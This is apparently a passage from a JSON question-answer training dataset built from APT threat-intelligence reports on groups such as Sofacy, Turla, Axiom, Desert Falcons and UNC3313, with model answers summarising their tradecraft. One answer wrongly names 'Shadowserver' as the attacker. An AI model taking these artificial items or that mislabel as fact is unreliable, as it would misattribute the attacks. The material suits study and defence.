Updates. A version of the tool is also available from the Microsoft Download Center. The MSRT was downloaded and executed more than 600 million times each month on average in 1H15. The MSRT is not a replacement for an up-to-date real-time antivirus solution.\n\uf0b7 The (<http://www.microsoft.com/security/scanner>)Microsoft Safety Scanner is a free downloadable security tool that provides on-demand scanning and helps remove malware and other malicious software. The Microsoft Safety Scanner is not a replacement for an up-to-date antivirus solution, because it does not offer real-time protection and cannot prevent a computer from becoming infected.\n\uf0b7 \uf0b7 Malware Protection Engine and the Microsoft antivirus signature database to provide real-time, scheduled, and on-demand protection.\n\uf0b7 \uf0b7 \uf0b7 \uf0b7 Figure 96. US privacy statements for the Microsoft products and services used in this report\nBig Headline: Appendix C: Worldwide encounter and infection rates\nFigure 97. Encounter and infection rates for locations around the world, 1Q15\u20132Q15, by quarter (100,000 computers reporting minimum)\n22 Encounter rate and CCM are shown for locations with at least 100,000 computers running Microsoft real-time security products and the Malicious Software Removal Tool, respectively, during a quarter. Only computers whose users have opted in to provide data to Microsoft are considered when calculating encounter and infection rates.\nMedium Headline: ActiveX control\nA software component of Microsoft Windows that can be used to create and distribute small applications through Internet Explorer. ActiveX controls can be developed and used by software to perform functions that would otherwise not be available using typical Internet Explorer capabilities. Because ActiveX controls can be used to perform a wide variety of functions, including downloading and running programs, vulnerabilities discovered in them may be exploited by malware. In addition, cybercriminals may also develop their own ActiveX controls, which can do damage to a computer if a user visits a webpage that contains the malicious ActiveX control.\nMedium Headline: rooting\nObtaining administrative user rights on a mobile device through the use of exploits. Device owners sometimes use such exploits intentionally to gain access to additional functionality, but these exploits can also be used by attackers to infect devices with malware that bypasses many typical security systems. The term \"rooting\" is typically used in the context of Android devices; the comparable process on iOS devices is more commonly referred to as jailbreaking.\nMedium Headline: social engineering\nA technique that defeats security precautions by exploiting human vulnerabilities. Social engineering scams can be both online (such as receiving email messages that ask the recipient to click the attachment, which is actually malware) and offline (such as receiving a phone call from someone posing as a representative from one's credit card company). Regardless of the method selected, the purpose of a social engineering attack remains the same\u2014to get the targeted user to perform an action of the attacker's choice.\n\nHow does the Microsoft Malware Protection Center (MMPC) handle new or unknown malware threats, and what steps are taken to ensure that these threats are eventually detected and removed?",
    "output": "A: The MMPC constantly analyzes malware samples submitted to it. When a new or unknown threat is encountered, it may not be recognized immediately due to various reasons such as being a new malware family, a new variant, or an encrypted version of known malware. The MMPC develops appropriate detection signatures for these threats and deploys them to customers using SCEP, Microsoft Security Essentials, and Windows Defender. This process ensures that even if a threat is initially missed, it will be detected and removed once the signature database is updated.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: 2. Introduction\nThe geopolitical conflicts in the Middle East have deepened over the last few years. The crisis is taking many forms, and the conflict in cyberspace is intensifying as different sides try to shift the struggle in their favour by exploiting cyber intelligence and distorting news.\nTargeted cyberattacks have also increased rapidly in the region over the last few years, with victims identified for almost every one of the major advanced cyberattack campaigns (Regin, Epic Turla, Careto, Nettraveler, Red October, Flame, Gauss, Duqu, and more.)\nThe Global Research and Analysis Team (GReAT) at Kaspersky Lab has uncovered new targeted attacks in the Middle East. Native Arabic-speaking cybercriminals have built advanced methods and tools to deliver, hide and operate malware that they have also developed themselves. This malware was originally discovered during an investigation of one of the attacks in the Middle East.\nPolitical activities and news are being actively used by the cybercriminals to entice victims into opening files and attachments. Content has been created with professionalism, with well designed visuals and interesting, familiar details for the victims, as if the information were long awaited.\nThe victims of the attacks to date have been carefully chosen; they are active and influential in their respective cultures, but also attractive to the cybercriminals as a source of intelligence and a target for extortion.\nThe attackers have been operating for more than two years now, running different campaigns, targeting different types of victims and different types of devices (including Windows- and Android-based). We suspect that at least 30 people distributed across different countries are operating the campaigns.\nAs a security organization, our analysis has focused only on the malware and the facts uncovered during our research.\nThe falcon is a popular and rare bird that has existed for a long time in Arabian countries with deserts, such as Egypt, Syria, the United Arab Emirates, Palestine, Saudi Arabia, and Oman, among others. It is also a symbol of hunting and sharp vision. The Desert Falcons are proficient cyberattackers, with carefully chosen targets, who are all thoroughly investigated before being attacked and infected.\n\nQ: What characteristics of the Desert Falcons' operations indicate that they are a sophisticated and organized group? Discuss the factors contributing to their advanced capabilities.",
    "output": "A: Several characteristics indicate that the Desert Falcons are a sophisticated and organized group. Firstly, they have been operating for over two years, running multiple campaigns targeting different types of victims and devices, including both Windows- and Android-based systems. Secondly, their operations involve at least 30 individuals distributed across various countries, suggesting a significant level of coordination and resources. Additionally, they have developed advanced methods and tools to deliver, hide, and operate their own malware, demonstrating technical proficiency. Their careful selection of high-value targets, who are influential in their respective cultures and attractive for intelligence gathering and extortion, further underscores their strategic approach.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Sofacy's 'Komplex' OS X Trojan\nBy Dani Creus , Tyler Halfpop and Robert Falcone\nUnit 42 researchers identified a new OS X Trojan associated with the Sofacy group that we are now tracking with the 'Komplex' tag using the Palo Alto Networks AutoFocus threat intelligence platform.\nThe Sofacy group, also known as APT28, Pawn Storm, Fancy Bear, and Sednit, continues to add to the variety of tools they use in attacks; in this case, targeting individuals in the aerospace industry running the OS X operating system. During our analysis, we determined that Komplex was used in a previous attack campaign targeting individuals running OS X that exploited a vulnerability in the MacKeeper antivirus application to deliver Komplex as a payload. Komplex shares a significant amount of functionality and traits with another tool used by Sofacy \u2013 the Carberp variant that Sofacy had used in (<http://researchcenter.paloaltonetworks.com/2016/06/unit42-new-sofacy-attacks-against-us-government-agency/>)previous attack campaigns on systems running Windows. In addition to shared code and functionality, we also discovered Komplex command and control (C2) domains that overlapped with previously identified phishing campaign infrastructures associated with the Sofacy group.\nQ: How does the Sofacy group's Komplex OS X Trojan leverage existing vulnerabilities to deliver its payload, and what shared characteristics does it have with other tools used by the Sofacy group?",
    "output": "The Sofacy group's Komplex OS X Trojan leverages a vulnerability in the MacKeeper antivirus application to deliver its payload. This method allows the Trojan to exploit systems running the OS X operating system, particularly targeting individuals in the aerospace industry. Komplex shares significant functionality and traits with another tool used by Sofacy\u2014the Carberp variant, which was used in previous attack campaigns on systems running Windows. These shared characteristics include common code and functionalities. Additionally, Komplex uses command and control (C2) domains that overlap with previously identified phishing campaign infrastructures associated with the Sofacy group.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: 4.3.2 Affected Institutions\nDuring our investigations we found that a variety of personal information belonging to individuals had been compromised. This included various lists of contacts along with their personal details that could be used by the attackers. It also included information about travel, including air and rail tickets, receipts, invoices and other billing information. In addition we found personal banking information, scans of identification documents, job (and other) applications, legal documents and information about ongoing court cases. The attackers also exfiltrated personal email communications. All of this information can be leveraged for future attacks, especially attacks against those within the compromised individual's social network.\n\u2462\nNational Security Council Secretariat, India\nThe National Security Council Secretariat (NSCS) of India is comprised of the Joint Intelligence Committee and is a component of the National Security Council established in 1998 along with a Strategic Policy Group and an Advisory Board. The National Security Council is headed by the Prime Minister of India and is responsible for strategic planning in the area of national security (Subrahmanyam 2010; Indian Embassy 1998). We assess that a computer at the NSCS was compromised based on the documents exfiltrated by the attackers. During the period in which we monitored the attackers, fourteen documents, including two documents marked \"SECRET,\" were exfiltrated. In addition to documents containing the personal and financial\ninformation of what appears to be the compromised individual, the exfiltrated documents focus on India's security situation in the states of Assam, Manipur, Nagaland and Tripura as well as the Naxalites, Maoists, and what is referred to as \"left wing extremism.\"\n\u2462\nDiplomatic Missions, India\nIndia maintains numerous diplomatic missions abroad that provide consular services relating to passports and visas as well as faciltaing trade, commerce and engaging in diplomatic relations (Indian government 2010). We assess that computers at the Embassy of India, Kabul, the Embassy of India, Moscow, the Consulate General of India, Dubai, and the High Commission of India in Abuja, Nigeria were compromised based on the documents exfiltrated by the attackers. During the period in which we monitored the attackers, 99 documents, including what appears to be one encrypted diplomatic correspondence as well as five documents marked \"RESTRICTED\" and four documents marked \"CONFIDENTIAL,\" were exfiltrated. In addition to documents containing personal, financial, and travel information on embassy and diplomatic staff, the exfiltrated documents included numerous visa applications, passport office circulars, and country assessments and reports. Confidential visa applications from citizens of Afghanistan, Australia, Canada, the PRC, Croatia, Denmark, Germany, India, Ireland, Italy, New Zealand, Philippines, Senegal, Switzerland, Uganda, and the United Kingdom were among the exfiltrated documents.\n\u2462\nMilitary Engineer Services, India\nThe Military Engineer Services (MES) is a government construction agency that provides services to the Indian Army, Navy and Air Force. In addition, the MES services the government sector and civil works projects. We assess that computers at the MES-Bengdubi, MES-Kolkata, MES(AF)-Bangalore, and MES-Jalandhar were compromised based on the documents exfiltrated by the attackers. During the period in which we monitored the attackers, 78 documents were exfiltrated. While these documents included manuals and forms that would not be considered sensitive, they also included documents that contained private information on personnel, and documents and presentations concerning the financing and scheduling of specific engineering projects.\n\u2462\nMilitary Personnel, India\nWe assess that computers linked with the 21 Mountain Artillery Brigade in the state of Assam, the Air Force Station, Race Course, New Delhi and the Air Force Station, Darjipura Vadodara, Gujarat were compromised based on the documents exfiltrated by the attackers. During the period in which we monitored the attackers, sixteen documents were exfiltrated. One document contained personal information on Saikorian alumni of the Sainik School, Korukonda, which prepares students for entry into the National Defence Academy. One document is a detailed briefing on a live fire exercise while others pertain to surface-to-air missile systems and moving target indicators.\n\u2462\nMilitary Educational Institutions, India\nWe assess that computers at the Army Institute of Technology in Pune, Maharashtra and the Military College of Electronics and Mechanical Engineering in Secunderabad, Andhra Pradesh were compromised based on the documents exfiltrated by the attackers. During the period in which we monitored the attackers, twenty-one documents, including one marked \"RESTRICTED\", were exfiltrated. There are documents and presentations detailing the finances of one of the institutions as well as personal and private information on students and their travel. There is also a document that describes \"Project Shakti,\" the Indian Army's command and control system for artillery (India Defence 2007).\n\u2462\nInstitute for Defence Studies and Analyses, India\nWe assess that computers at the Institute for Defence Studies and Analyses (IDSA) were compromised based on the documents exfiltrated by the attackers. During the period in which we monitored the attackers, 187 documents were exfiltrated. While many of the documents were published papers from a variety of academic sources, there were internal documents, such as an overview of the IDSA research agenda, minutes of\nmeetings for the Journal of Defence Studies, budgets and information on a variety of speakers, visitors, and conference participants.\n\u2462\nDefence-oriented publications, India\nWe assess that computers at the India Strategic defence magazine and FORCE magazine were compromised based on the documents exfiltrated by the attackers. During the period in which we monitored the attackers, 58 documents were exfiltrated. While these documents include publicly accessible articles and previous drafts of those articles, there is also private information regarding the contact details of subscribers and conference participants. The documents also include interviews, documents, and PowerPoint presentations from conferences that detail national security topics, such as network data and monitoring for national security, and responses to combat cyber threats.\n\u2462\nCorporations, India\nWe assess that computers at YKK India Private Limited, DLF Limited, and TATA were compromised based on the documents exfiltrated by the attackers. During the period in which we monitored the attackers, five documents were exfiltrated. These documents include rules overseeing busiiness travel, a presentation on roadmap and financial status, and an annual plan for a business partnership.\n\u2462\nMaritime, India\nWe assess that computers at the National Maritime Foundation and the Gujarat Chemical Port Terminal Company Limited were compromised based on the documents exfiltrated by the attackers. During the period in which we monitored the attackers, 53 documents were exfiltrated. These documents include a summary of a seminar as well as numerous documents relating to specific shipping schedules, financial matters and personal medical information.\n\u2462\nUnited Nations\nThe United Nations Economic and Social Commission for Asia and the Pacific (UNESCAP) is based in Thailand and facilitates development in the Asia-Pacific region. We assess that a computer at UNESCAP has been compromised based on the documents exfiltrated by the attackers. In addition to information concerning a variety of conferences and presentations, there were also internal Mission Report documents regarding travel and events in the region.\nPART 5:\n\nWhat types of documents were exfiltrated from the compromised diplomatic missions in India, and what sensitive information did these documents contain?",
    "output": "During the Shadowserver attacks, 99 documents were exfiltrated from the compromised diplomatic missions in India. These included one encrypted diplomatic correspondence, five documents marked 'RESTRICTED,' and four documents marked 'CONFIDENTIAL.' The exfiltrated documents contained personal, financial, and travel information on embassy and diplomatic staff, numerous visa applications, passport office circulars, and country assessments and reports. Confidential visa applications from citizens of various countries, including Afghanistan, Australia, Canada, the PRC, Croatia, Denmark, Germany, India, Ireland, Italy, New Zealand, Philippines, Senegal, Switzerland, Uganda, and the United Kingdom, were among the exfiltrated documents.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: Loader\nWith previous versions of Neuron, a native dropper was utilised to write the main payload to disk, establish persistence and ensure execution. This latest version uses a native x64 loader to execute the .NET payload in-memory. The payload is encrypted within the loader, which ensures the payload never touches disk in plaintext. This modification has likely been made to evade detection during disk scans performed by anti-virus products, however anti-virus products that scan memory will still likely be able to detect the payload running.\nThe loader has the required exports to enable the configuration as a service, therefore it's believed this will be the method used for persistence.\nThe loader can also specify which endpoints (HTTP(S) or pipe) to listen on by passing them to the .NET executable as arguments. In this sample the endpoints specified are different to previous versions:\n\u2022 http://*:80/OWA/OAB/\n\u2022 https://*:443/OWA/OAB/\nIf no arguments are provided the payload will use the following defaults for HTTP(S) or pipes:\n\u2022 http://*:80/W3SVC/\n\u2022 https://*:443/W3SVC/\n\u2022 pipe://*/Winsock2/baseapi_http\nError handling has been added to the new payload. If the webserver encounters an exception it will attempt to use the default values above, if another exception occurs then the payload will revert to using the default HTTP (port 80) value.\nSmall Headline: Encryption\nPrevious versions of Neuron used RC4 for the encryption of data stored on disk or sent over the network. Portions of the updated Neuron service have been migrated to AES, however, some components still rely on the RC4 implementation, such as encrypting command information.\nThe actors have configured multiple hardcoded encryption keys rather than using one for everything. For example, one is used for normal communication between nodes, and another is used if the node is proxying a request. These modifications are likely implemented to make detection and decryption by network defenders more difficult.\nSmall Headline: Communications\nThe communication between clients and servers has also changed to avoid detection. The server expects a POST request, but rather than using the previous pre-defined parameter names (cid, cadata etc.), the new function loops through each parameter looking for certain characters within that parameter's value to determine what functionality should be performed. This will allow the parameter names to be randomly generated and/or regularly changed, making it more difficult for network defenders to reliably detect communications.\nAs an example, the following characters are looked for (in the order shown) to determine which functionality should be performed:\nAnswer this question: How does the latest version of the Neuron malware, used by the Turla group, evade detection during disk scans by anti-virus products? What implications does this have for traditional anti-virus solutions?",
    "output": "The latest version of the Neuron malware uses a native x64 loader to execute the .NET payload in-memory. The payload is encrypted within the loader, ensuring that it never touches the disk in plaintext. This modification helps the malware evade detection during disk scans performed by anti-virus products. However, anti-virus products that scan memory will still likely be able to detect the payload running. This highlights the importance of using advanced detection techniques that go beyond traditional disk scanning, such as memory analysis and behavioral monitoring, to effectively identify and mitigate sophisticated threats like Neuron.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Previous Public Reporting\nIn addition to the malware binaries that Novetta has analyzed and attributed to Axiom, we have found similarities in several high-profile cyber attacks since 2009. The following timeline details some of the attacks that we know exhibit similar TTPs or leverage overlapping tools and infrastructure with those we have attributed to Axiom.\n\u25cf June - December 2009: Operation Aurora (Hydraq)\n\u25cf December 2009: Elderwood Project leveraging 0days6 (Hydraq)\n\u25cf March, April June 2011: Elderwood Platform Attacks\n\u25cf April, May, August 2012: Elderwood Platform Attacks\n\u25cf June - July 2012: VOHO Campaign wateringhole attacks7 (Gh0st RAT, Hydraq)\n\u25cf July 2012 - January 2013: Bit9 Compromise8, 9 (Hikit)\n\u25cf June 2013: Shell_Crew Compromise of ColdFusion Server10 (Derusbi)\n\u25cf September 2013: Operation Deputy Dog Attack on Japanese Targets11\n\u25cf November 2013: Operation Ephemeral Hydra involving Internet Explorer Zero-day (DeputyDog)12\n\u25cf January 2014: 3 new 0-Day exploits leveraged by Elderwood Platform13\n\u25cf February 2014: Operation Snowman attack on the US Veterans of Foreign Wars website (DeputyDog)14\n\u25cf June - July 2014: American Middle Eastern Policy think tank attacks15\nAs part of Operation Aurora, Google16, Adobe17, Rackspace and 32 other companies were compromised in similar fashion by attackers with connections to China, who we believe exhibit\nsome of Axiom's characteristics18. Microsoft also reported being subject to similar style attacks, though those attempts were unsuccessful19. In April 2013, Microsofts' David Aucsmith20 suggested that the Aurora campaign that targeted Google may have been part of a larger Chinese counterintelligence operation aimed at gaining insights to Chinese Gmail accounts which were under FISA (Foreign Intelligence Surveillance Act) surveillance. Later, in May 2013, the Washington Post21 would report that according to current and former government officials, the Chinese had successfully accessed Google's database of flagged email accounts that were placed under 702 foreign surveillance by U.S. Law Enforcement and counterintelligence. It is unclear whether these exploitation operations can be directly linked to Axiom, however we have seen direct evidence that Axiom is highly interested in targeting organizations with data that may aid human intelligence or counterintelligence operations.\n6 http://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/the-elderwood-project.pdf\n-\n7 https://blogs.rsa.com/wp-content/uploads/2014/10/VOHO_WP_FINAL_READY-FOR-Publication09242012_AC.pdf 8\nhttp://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/hidden_lynx.pdf\n9 https://blog.bit9.com/2013/02/25/bit9-security-incident-update/\n10 http://www.emc.com/collateral/white-papers/h12756-wp-shell-crew.pdf\n11 http://www.fireeye.com/blog/technical/cyber-exploits/2013/09/operation-deputydog-zero-day-cve-2013-3893-attack-against-japanese-targets.html\n12 http://www.fireeye.com/blog/technical/cyber-exploits/2013/11/operation-ephemeral-hydra-ie-zero-day-linked-to-deputydog-uses-diskless-method.html\n13 http://www.symantec.com/connect/blogs/how-elderwood-platform-fueling-2014-s-zero-day-attacks\n14 http://www.fireeye.com/blog/technical/cyber-exploits/2014/02/operation-snowman-deputydog-actor-compromises-us-veterans-of-foreign-wars-website.html\n15 http://www.washingtonpost.com/blogs/the-switch/wp/2014/07/07/chinese-cyberspies-have-hacked-middle-east-experts-at-major-u-s-think-tanks/\n16 http://googleblog.blogspot.com/2010/01/new-approach-to-china.html\nDuring the summer of 2012, the VOHO Campaign was discovered by private industry to be leveraging watering-hole attacks and several exploits to download and install variants of Gh0st RAT and Hydraq. The VOHO attacks occurred in two phases, each phase using a different zero-day vulnerability, over multiple weeks during July 2012. According to RSA's reporting on this campaign, nearly 1,000 organizations across multiple industries were impacted during the first phase, resulting in roughly 4,200 individual machines being compromised.  During this multi phased attack campaign security firm Bit9 was targeted and Axiom operators gained access to a Bit9 digital certificate. Which they then used to sign custom variants of the Hikit malware in an effort to bypass the additional security provided by their product at specific organizations within the VOHO target set.\nThe ability to target, compromise, and filter tens of thousands of individual infections across nearly 1000 organizations, in order to identify victims to further other active attacks indicates a level of technical, organizational, and operational sophistication not typically seen. The techniques used and malware delivered in the VOHO Campaign have been tied to Axiom, and the use of digital certificates to deliver malware is also a well-known technique for Axiom.\nWatering-hole attacks that include 0-day exploits require planning and sophistication, as the attackers need to identify sites frequented by their targets, compromise those third party website(s), have available 0-day exploits, and then ultimately compromise the visiting targets' systems. Coupling a watering hole attack with a supply chain attack requires even more planning. The fact that the VOHO watering hole attack, the Bit9 compromise, and the delivery of the custom Hikit malware all occurred within a one week period suggests a highly organized\ngroup able to carry out simultaneous and independent objectives against larger goals, possibly under the direction and supervision of a larger organization.\n17 http://blogs.adobe.com/conversations/2010/01/adobe_investigates_corporate_n.html\n18 http://www.wired.com/2010/01/operation-aurora/\n19 http://www.darkreading.com/attacks-and-breaches/google-aurora-hack-was-chinese-counterespionage-operation/d/d-id/1110060?\n20 http://www.cio.com/article/2386547/government/-aurora--cyber-attackers-were-really-running-counter-intelligence.html\n-\n21 http://www.washingtonpost.com/world/national-security/chinese-hackers-who-breached-google-gained-access-to-sensitive-data-us-officials-say/2013/05/20/51330428-be34-11e2-89c93be8095fe767_story.html\nAnother series of attacks named the Elderwood Project22 began in late 2009 and used a notably large number of zero-day vulnerabilities to deliver malware (Hydraq) onto targeted networks. The attackers delivered these exploits using a variety of methods including a watering hole attack targeting the Amnesty International Hong Kong website, which may provide insight into at least some of the victims targeted. The threat actors behind these attacks had access to multiple critical zero-day vulnerabilities, suggesting the group had resources to develop them or to acquire them from other. It should also be noted that the stated techniques of the actors behind Elderwood include targeting of supply-chain organizations of their intended targets.\nAmerican think tanks focusing on Iraq have also been targets of watering-hole attacks23 that utilize malware also occasionally used by the Axiom group: Derusbi. The attack was specifically looking for users with identified Chinese, US English, Russian, Japanese, or Korean language machines24. Although previous Chinese cyber attacks targeting think tanks have concentrated on those involved in East Asian policy, this shift may be reflective of China's renewed interest in the Middle East due to their dependence on oil production from this region25. Although this is not as strong a link to the Axiom threat group, the fact that Derusbi was used is notable, as this malware is not widely distributed beyond intermediate stages of operations that have been attributed to Axiom.\nWhen comparing the last three campaigns that have discussed(VOHO, Elderwood Project, and Iraq-focused think-tanks), beyond the toolset:\n\u25cf They all used waterholing as their primary initial infection vector\n\u25cf They all required the ability to sift potentially large sets of infected machines to identify targets of high interest for further exploitation.\n\u25cf They all targeted (at least in part) non-profit organizations that deal with information related to Chinese policy or Chinese stated interests.\nThe fact that the primary beneficiary of information stolen in these campaigns is not military or directly financial, but rather intelligence benefiting Chinese domestic and international policies, is highly telling and implies the Chinese Intelligence Apparatus could be behind such attacks.\n22 http://www.symantec.com/connect/blogs/elderwood-project\n23 http://www.washingtonpost.com/blogs/the-switch/wp/2014/07/07/chinese-cyberspies-have-hacked-middle-east-experts-at-major-u-s-think-tanks/\n24 http://www.symantec.com/connect/blogs/internet-explorer-zero-day-used-watering-hole-attack-qa\n25 http://www.businessweek.com/articles/2014-06-17/iraq-crisis-could-threaten-chinese-oil-investments\n\nAnswer this question based on the above context: What insights does the Elderwood Project provide about the resources and tactics of the Axiom threat group?",
    "output": "The Elderwood Project provides insights into the significant resources and advanced tactics of the Axiom threat group. Beginning in late 2009, the project used a large number of zero-day vulnerabilities to deliver malware, such as Hydraq, onto targeted networks. The attackers employed various methods, including watering-hole attacks targeting websites like Amnesty International Hong Kong. The availability of multiple critical zero-day vulnerabilities suggests that the group had the resources to either develop these exploits themselves or acquire them from other sources. Additionally, the Elderwood Project targeted supply-chain organizations, indicating a strategic approach to infiltrating their intended targets.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What was the purpose of the 'LHAFD.GCP' file in the Red October attacks, and how was it used to establish communication with the C&C servers?",
    "output": "The 'LHAFD.GCP' file was an encrypted and compressed backdoor, which was decoded by the loader module ('svchost.exe'). Once decrypted, this file was injected into system memory and was responsible for communication with the C&C servers. The main backdoor component started only after its loader checked for an available internet connection by attempting to connect to three Microsoft hosts. After validation, the loader executed the main backdoor component, which connected to its C&C servers using encrypted communication.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "'Operation Sharpshooter' Targets Global Defense, Critical Infrastructure\nDecember 12,\n2018\nBy and on Dec 12, 2018\nThis post was written with contributions from the McAfee Advanced Threat Research team.\nThe McAfee Advanced Threat Research team and McAfee Labs Malware Operations Group have discovered a new global campaign targeting nuclear, defense, energy, and financial companies, based on McAfee\u00ae Global Threat Intelligence. This campaign, Operation Sharpshooter, leverages an in-memory implant to download and retrieve a second-stage implant\u2014which we call Rising Sun\u2014for further exploitation. According to our analysis, the (<https://www.computerworld.com/article/2998498/malware-vulnerabilities/s-korean-manufacturing-industry-targeted-with-new-backdoor-program.html>)Rising Sun implant uses source code from the Lazarus Group's 2015 backdoor in a new framework to infiltrate these key industries.\nOperation Sharpshooter's numerous technical links to the Lazarus Group seem too obvious to immediately draw the conclusion that they are responsible for the attacks, and instead indicate a potential for false flags. Our research focuses on how this actor operates, the global impact, and how to detect the attack. We shall leave attribution to the broader security community.\nQ: How does Operation Sharpshooter leverage its initial implant to facilitate further exploitation, and what implications does this have for defending against such attacks?",
    "output": "Operation Sharpshooter utilizes an in-memory implant to download and retrieve a second-stage implant known as 'Rising Sun.' This two-stage approach allows the attackers to initially establish a foothold within the targeted systems without leaving persistent artifacts on disk, making detection more challenging. The Rising Sun implant then facilitates further exploitation by providing additional capabilities for the attackers. This methodology highlights the importance of advanced threat detection mechanisms that can identify in-memory threats and the need for robust incident response plans to mitigate the risks associated with multi-stage attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Mitigation\nStopping zero-day exploits in Windows 10\nPROMETHIUM and NEODYMIUM both used a zero-day exploit that executed code to download a malicious payload. (<https://support.office.com/en-us/article/What-is-Protected-View-d6f09ac7-e6b9-4495-8e43-2bbcdbcb6653>)Protected view, a security feature that was introduced in Microsoft Office 2010, prevents the malicious Flash code from loading when the document is opened. (<https://msdn.microsoft.com/en-us/library/windows/desktop/mt637065(v=vs.85).aspx>)Control Flow (<https://msdn.microsoft.com/en-us/library/windows/desktop/mt637065(v=vs.85).aspx>)Guard, a security feature that is turned on by default in Windows 10 and Microsoft Office 365 64-bit version, can help by making it more difficult to exploit memory corruption vulnerabilities. The Flash vulnerability CVE-2016-4117 is a type confusion vulnerability in the DeleteRangeTimelineOperation class. The referenced exploit only reliably works on specific Windows platforms because of a ByteArray mitigation in Flash Player, which causes Microsoft to believe that the exploit was authored with pre-knowledge of the victim's computer information. The exploit uses the Adobe Flash Player's Function object vftable corruption method to achieve code execution.\nControl Flow Guard makes it more difficult to exploit memory corruption vulnerabilities.\nBecause 64-bit versions of Windows 10 enforce driver signing, malicious code that attempts to load a locally made, untrusted driver will be stopped in its tracks.\nIn addition, the technique of using lsass.exe to load a malicious DLL files can be mitigated by an optional feature introduced in Windows 10 called (<https://technet.microsoft.com/en-us/itpro/windows/keep-secure/credential-guard>)Credential (<https://technet.microsoft.com/en-us/itpro/windows/keep-secure/credential-guard>)Guard. Microsoft highly recommends that network administrators test and enable this feature. In Wingbird's case, the malicious sspisrv.dll will not load because it wasn't signed by a trusted certificate.\nThe (<https://blogs.technet.microsoft.com/datacentersecurity/2016/09/20/overview-of-device-guard-in-windows-server-2016/>)Hypervisor Code Integrity (HVCI) service enables the Device Guard feature in Windows 10 to help protect kernel mode processes and drivers from\nvulnerability exploits and zero-day exploits. HVCI uses the processor's functionality to force all software running in kernel mode to safely allocate memory, which means that after memory has been allocated, its state must be changed from writable to read-only or execute-only. By forcing memory into these states, HVCI helps ensure that attacks are unable to inject malicious code into kernel mode processes and drivers through techniques such as buffer overflows and heap spraying.\nDetecting malicious behavior with Windows Defender Advanced Threat Protection\nThe NEODYMIUM attack campaign executed the following five malicious behaviors, all of whichare detected by (<https://blogs.windows.com/windowsexperience/2016/03/01/announcing-windows-defender-advanced-threat-protection/>)Windows Defender ATP:\n1. Zero-day exploit code causes a Microsoft Office file to generate and open an executable file.\nFigure 7. Windows Defender ATP shows an alert for an exploit resulting in a malicious file executing on an endpoint\n2. Zero-day exploit code allows an executable file to gain higher privileges.\n3. A suspicious file self-deletes, a behavior associated with malware that erases traces of infection as a way to evade forensic analysis.\nFigure 8. Windows Defender ATP shows an alert for processes that attempt self-deletion\n4. Malware executes DLL-side loading, a technique in which attackers replace legitimate DLL files in non-standard folders with malicious ones so that the malicious file is loaded when the application or operating system starts.\nFigure 9. Windows Defender ATP shows an alert for DLL-side loading\n5. Malware injects code into legitimate processes, which is usually done to load the malware when system processes run.\nFigure 10. Windows Defender ATP shows an alert for suspicious code injections\nalong with Windows Defender or third-party antivirus security solutions. Additional information about the service is available (<https://www.microsoft.com/en-us/WindowsForBusiness/Windows-ATP>)here.\n\nQ: How does Control Flow Guard (CFG) in Windows 10 enhance the security against memory corruption vulnerabilities, particularly in the context of the PROMETHIUM and NEODYMIUM attacks?",
    "output": "A: Control Flow Guard (CFG) is a security feature that is turned on by default in Windows 10 and Microsoft Office 365 64-bit version. CFG makes it more difficult to exploit memory corruption vulnerabilities by enforcing strict rules on how applications can execute code. This feature helps prevent attackers from redirecting the flow of execution to malicious code, even if they manage to corrupt memory. In the context of the PROMETHIUM and NEODYMIUM attacks, CFG would have made it significantly harder for the attackers to successfully exploit the Flash vulnerability CVE-2016-4117, which relies on a type confusion vulnerability in the DeleteRangeTimelineOperation class.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Attribution\nMandiant uses the label \"UNC\" groups\u2014or \"uncategorized\" groups\u2014to refer to a cluster of intrusion activity that includes observable artifacts such as adversary infrastructure, tools, and tradecraft that we are not yet (<https://www.mandiant.com/resources/how-mandiant-tracks-uncategorized-threat-actors>)ready to give a classification such as TEMP, APT, or FIN (learn more about uncategorized threat actors). Mandiant assesses with moderate confidence that UNC3313 is associated with (<https://www.mandiant.com/resources/iranian-threat-group-updates-ttps-in-spear-phishing-campaign>)TEMP.Zagros (reported in open sources as MuddyWater), an Iran-nexus threat actor active since at least May 2017, based on currently available information. TEMP.Zagros has consistently updated their toolkit over the years, using malware such as , , and  in spear-phishing operations. The group's use of ScreenConnect for initial compromise is well documented in (<https://www.trendmicro.com/en_us/research/21/c/earth-vetala---muddywater-continues-to-target-organizations-in-t.html>)open sources.\nNotably, on January 12, 2022, the U.S. government publicly  it considers TEMP.Zagros as subordinate to the Iranian Ministry of Intelligence and Security (MOIS) and disclosed samples of malware families (POWGOOP and MORIAGENT) in use by the group since at least 2020.\nBig Headline: Targeting\nIn the second half of 2021, Mandiant identified an UNC3313 campaign using GRAMDOOR and STARWHALE to target Middle Eastern government and technology entities. TEMP.Zagros has historically targeted these regions and sectors throughout the Middle East and Central and South Asia, including government, defense, telecommunications, energy, and finance. Targeting patterns and related lures demonstrate a strong focus on targets with a geopolitical nexus and the telecommunications sector in the Middle East.\nRead the text above and answer this question: How does the attribution process work for UNC3313, and what evidence supports its association with TEMP.Zagros? Additionally, discuss the significance of the U.S. government's public statement regarding TEMP.Zagros.",
